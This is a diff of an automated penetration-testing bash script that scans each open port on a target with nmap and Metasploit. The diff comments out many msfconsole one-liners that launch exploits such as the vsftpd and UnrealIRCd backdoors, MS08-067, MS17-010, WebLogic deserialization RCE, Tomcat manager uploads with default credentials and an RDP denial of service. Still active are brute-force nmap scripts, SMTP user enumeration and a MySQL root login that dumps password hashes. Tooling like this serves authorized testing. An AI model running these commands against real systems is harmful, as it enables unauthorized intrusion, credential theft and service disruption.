@@ -160,12 +160,12 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -sC -T5 -p 21 --script=ftp-* $TARGET 
-  if [ $METASPLOIT_EXPLOIT = "1" ]; then
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/ftp_version; run; use auxiliary/scanner/ftp/anonymous; run; use exploit/unix/ftp/vsftpd_234_backdoor; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
-  fi
+#  if [ $METASPLOIT_EXPLOIT = "1" ]; then
+#    echo -e "${OKGREEN}====================================================================================${RESET}"
+#    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+#    echo -e "${OKGREEN}====================================================================================${RESET}"
+#    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/ftp_version; run; use auxiliary/scanner/ftp/anonymous; run; use exploit/unix/ftp/vsftpd_234_backdoor; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
+#  fi
 fi
 
 if [ -z "$port_22" ];
@@ -198,10 +198,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -sC -T5 -p 22 --script=ssh-* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use auxiliary/scanner/ssh/ssh_version; run; use scanner/ssh/ssh_enumusers; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use auxiliary/scanner/ssh/ssh_version; run; use scanner/ssh/ssh_enumusers; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
 fi
 
 if [ -z "$port_23" ];
@@ -219,10 +219,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -T5 --script=telnet* -p 23 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"
 fi
 
 if [ -z "$port_25" ];
@@ -238,10 +238,10 @@ else
   echo -e "$OKRED RUNNING SMTP USER ENUM SCRIPT $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;"
 fi
 
 if [ -z "$port_53" ];
@@ -415,10 +415,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -p 135 -T5 --script=rpc* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST \"$TARGET\"; run; back; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST \"$TARGET\"; run; back; exit;"
 fi
 
 if [ -z "$port_137" ];
@@ -434,10 +434,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -p 137 -T5 --script=broadcast-netbios-master-browser* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run; back;exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run; back;exit;"
 fi
 
 if [ -z "$port_139" ];
@@ -456,10 +456,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV  -T5 -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"
 fi
 
 if [ -z "$port_161" ];
@@ -471,10 +471,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 161 -sU -sT $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;"
 fi
 
 if [ -z "$port_162" ];
@@ -486,10 +486,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 162 -sU -sT $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;"
 fi
 
 if [ -z "$port_389" ];
@@ -587,10 +587,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/smb/smb_version; run; use auxiliary/scanner/smb/pipe_auditor; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use exploit/windows/smb/ms06_040_netapi; run; use exploit/windows/smb/ms05_039_pnp; run; use exploit/windows/smb/ms10_061_spoolss; run; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/smb/smb_version; run; use auxiliary/scanner/smb/pipe_auditor; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use exploit/windows/smb/ms06_040_netapi; run; use exploit/windows/smb/ms05_039_pnp; run; use exploit/windows/smb/ms10_061_spoolss; run; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"
 fi
 
 if [ -z "$port_512" ];
@@ -666,11 +666,11 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -T5 -p 1099 --script=rmi-* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run;"
-  msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run;"
+  #msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run;"
 fi
 
 if [ -z "$port_1433" ];
@@ -716,10 +716,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -T5 --script=ftp* -p 2121 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
 fi
 
 if [ -z "$port_3306" ];
@@ -731,10 +731,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn --script=mysql* -p 3306 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS \"$TARGET\"; run; back; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS \"$TARGET\"; run; back; exit;"
   mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'
 fi
 
@@ -769,10 +769,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -T5 --script=rdp-* -p 3389 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS \"$TARGET\"; run; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; run; back; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS \"$TARGET\"; run; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; run; back; exit;"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED RUNNING RDESKTOP CONNECTION $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -788,10 +788,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -T5 --script=distcc-* -p 3632 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"
 fi
 
 if [ -z "$port_4443" ];
@@ -828,10 +828,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn --script=pgsql-brute -p 5432 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; setg RHOSTS "$TARGET"; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; setg RHOSTS "$TARGET"; run; exit;"
 fi
 
 if [ -z "$port_5555" ];
@@ -866,10 +866,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV  -T5 --script=vnc* -p 5900 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$TARGET\"; run; back; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$TARGET\"; run; back; exit;"
 fi
 
 if [ -z "$port_5984" ];
@@ -881,10 +881,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -T5 --script=couchdb* -p 5984 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"
 fi
 
 if [ -z "$port_6000" ];
@@ -896,10 +896,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -T5 --script=x11* -p 6000 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;"
 fi
 
 if [ -z "$port_6667" ];
@@ -911,10 +911,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -T5 --script=irc* -p 6667 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
 fi
 
 if [ -z "$port_7001" ];
@@ -926,11 +926,11 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -sV -p 7001 --script=weblogic-t3-info.nse $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL true; run; exit;"
-  msfconsole -q -x "use exploit/linux/misc/jenkins_java_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 7001; set SSL true; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL true; run; exit;"
+  #msfconsole -q -x "use exploit/linux/misc/jenkins_java_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 7001; set SSL true; run; exit;"
 fi
 
 if [ -z "$port_8000" ];
@@ -1015,14 +1015,14 @@ else
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "${OKBLUE}[*] If you see a 200 response code below, try running 'msfconsole -q -x \"multi/http/struts2_content_type_ognl; set RHOST \"$TARGET\"; exploit -j; exit;"
   curl -I http://$TARGET:8080/struts2-showcase/ -s | grep HTTP | grep 200
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING APACHE TOMCAT EXPLOITS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use admin/http/jboss_bshdeployer; run; use auxiliary/scanner/http/jboss_status; run; use admin/http/tomcat_administration; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING WILDFLY TRAVERSAL EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/http/wildfly_traversal; setg RHOSTS "$TARGET"; set RPORT 8080; run; back; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING APACHE TOMCAT EXPLOITS $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use admin/http/jboss_bshdeployer; run; use auxiliary/scanner/http/jboss_status; run; use admin/http/tomcat_administration; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING WILDFLY TRAVERSAL EXPLOIT $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/scanner/http/wildfly_traversal; setg RHOSTS "$TARGET"; set RPORT 8080; run; back; exit;"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED RUNNING JEXBOSS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -1051,14 +1051,14 @@ else
   echo -e "$OKRED RUNNING CVE-2017-5638 EXPLOIT $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNING APACHE TOMCAT EXPLOITS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
